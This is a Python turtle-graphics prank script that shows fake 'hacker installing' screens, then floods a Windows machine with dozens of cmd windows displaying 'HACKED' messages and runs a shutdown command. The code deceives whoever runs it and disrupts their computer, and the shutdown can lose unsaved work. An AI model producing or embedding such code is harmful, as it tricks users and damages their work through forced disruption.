# created by #don anu

'''import function '''

import os
import turtle as t
import webbrowser as hackedWeb
from random import randrange

ts = t.Screen()
tt = t.Turtle()
t.tracer(0) # To Stop Animations 

#os.rmdir("HACKED~")
#os.mkdir("HACKED~")
ts.bgcolor("black")
tt.pencolor("green")

def d_write(a,b):
    for dw in a:
        tt.write(
            dw ,True,font =("Algerian",b)
                )
        ts.delay(40)

    #here a is string to write or b is that font


d_write("hi their me don~anu",20)
tt.penup()
tt.goto(0,-50)
d_write(" click this bottun  -> (O) <-  ",24)
ts.exitonclick()

#for exit on click from turtle
# ts.Terminator()
# ts.update()      #         ---> PROBLEM  <------
#ts.reset()

ts = t.Screen()
tt = t.Turtle()
ts.bgcolor("black")
tt.goto(-100,-100)
tt.pencolor("green")
d_write("installing  ",25)
for i in range(0,3):
    tt.circle(10)
    tt.forward(40)

'''
For the installation of hacker programm '''

tt.penup()
tt.goto(-100,-175)
tt.pendown()
tt.width(30)
for i in range(0,200):
    tt.fd(1)

    # to be update by the showing no
    # by the circle installation

tt.penup()
tt.goto(-50,150)
tt.pendown()
d_write("to start click here ",35)
tt.pu()
tt.goto(20,110)
tt.setheading(180)
tt.pencolor("red")
tt.circle(40)
tt.pu()
tt.goto(20,105)
tt.pd()
tt.fill_color("red")
tt.begin_fill()
tt.circle(35)
tt.end_fill()

#after installation of hack

ts.exitonclick()

ts = t.Screen()
tt = t.Turtle()
ts.bgcolor("gray")
tt.pencolor("green")

def oc_reset():
    ts.reset()
    ts.bgcolor("black")
    tt.pencolor("green")

d_write("Don'ts click ",35)
tt.fd(23)
tt.pu()
tt.goto(50,-80)
tt.pd()
d_write("(O)",50)
ts.exitonclick()


# done with turtle 

'''
work on the cmd '''

os.system(
    'cmd /k "for /l %i in (1,1,65) do (start cmd /k color a & echo "Hacker is Here (*_*)/" & echo "|-|4ck3r 15 |-|3r3 (>_<)" ) " '
    )
for i in range(0,randrange(7,12)):
    os.system(
        'start cmd & prompt "HACKED~(>.<)by-anu~" & color 4'
        'start cmd & color a & dir /s'

            )


'''command for shutdown'''

os.system('cmd /k "shutdown /s /ts 60"')

oc_reset()
ts = t.Screen()
tt = t.Turtle()
tt.pu()
tt.bk(100)
tt.pd()
d_write(
    "NICE to meet you sir ",20
    )
tt.pu()
tt.goto(0,-50)
tt.pd()
tt.pencolor("red")
for dw in "now i SHUTDOWN YOUR PC ":
        tt.write(
            dw ,True,font =("Algerian",25)
                )
        ts.delay(40)


tt.pu()
tt.goto(-200,-250)
tt.pd()
for dw in "#DonAnu":
        tt.write(
            dw ,True,font =("Algerian",28)
                )
        ts.delay(40)

# donew with this
